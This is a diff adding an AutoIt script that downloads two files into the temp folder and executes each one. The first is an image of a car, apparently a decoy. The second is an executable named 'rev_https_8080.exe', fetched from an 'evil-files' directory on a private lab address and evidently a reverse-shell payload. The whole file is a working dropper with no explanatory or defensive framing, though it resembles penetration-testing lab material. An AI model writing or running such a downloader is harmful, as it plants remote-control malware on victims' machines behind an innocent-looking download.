@@ -1,0 +1,21 @@
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "https://imgd.aeplcdn.com/0x0/n/cw/ec/56265/f-pace-exterior-right-front-three-quarter-2.jpeg,http://10.0.2.7/evil-files/rev_https_8080.exe"
+
+Local $urlsArray = StringSplit($urls, ",", 2 )
+
+For $url In $urlsArray
+	$sFile = _DownloadFile($url)
+	shellExecute($sFile)
+
+Next
+
+Func _DownloadFile($sURL)
+    Local $hDownload, $sFile
+    $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sDirectory = @TempDir & $sFile
+    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc   ;==>_GetURLImage
